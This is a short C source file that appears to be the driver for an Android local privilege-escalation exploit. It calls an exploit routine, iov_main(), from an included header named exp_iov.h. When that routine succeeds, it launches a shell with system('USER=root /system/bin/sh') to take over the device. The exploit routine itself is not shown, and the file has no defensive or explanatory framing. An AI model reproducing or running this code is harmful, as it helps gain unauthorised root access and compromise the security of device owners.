//
//  main.c
//  srv
//
//  Created by Rocky on 3/2/14.
//  Copyright (c) 2014 bidiclone. All rights reserved.
//

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/prctl.h>
#include "exp_iov.h"

#ifdef __cplusplus
    extern "C" {
#endif

void __exidx_start() {}
void __exidx_end()   {}

#ifdef __cplusplus
    }
#endif
    

int main(int argc, char* argv[])
{
	if (iov_main() == 0) 
	{
		system("USER=root /system/bin/sh");
		return 0;
	}

	return -1;
}

